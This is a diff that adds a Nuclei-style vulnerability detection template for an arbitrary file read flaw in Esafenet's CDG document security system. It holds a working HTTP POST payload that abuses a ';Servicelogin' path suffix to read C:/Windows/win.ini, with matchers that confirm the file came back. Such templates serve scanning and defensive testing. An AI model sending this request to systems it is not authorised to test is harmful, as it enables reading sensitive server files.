@@ -1,0 +1,39 @@
+id: esafenet-cdgserver3-Servicelogin-fileread
+info:
+  name: 亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 亿赛通电子文档安全管理系统的 UploadFileManagerService 接口存在任意文件读取漏洞。攻击者可通过构造特定请求，利用该接口的文件路径参数读取服务器上的任意文件内容，从而获取敏感信息，影响范围包括系统配置文件、用户数据等，支持远程利用。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/gdi6d5sw8wg1v86n
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: esafenet,fileread
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/document/UploadFileManagerService;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 85
+
+        command=ViewUploadFile&filePath=C:/Windows/win.ini&fileName1=1.png&fromurl=/frame.jsp
+        
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+
+      - type: status
+        status:
+          - 200
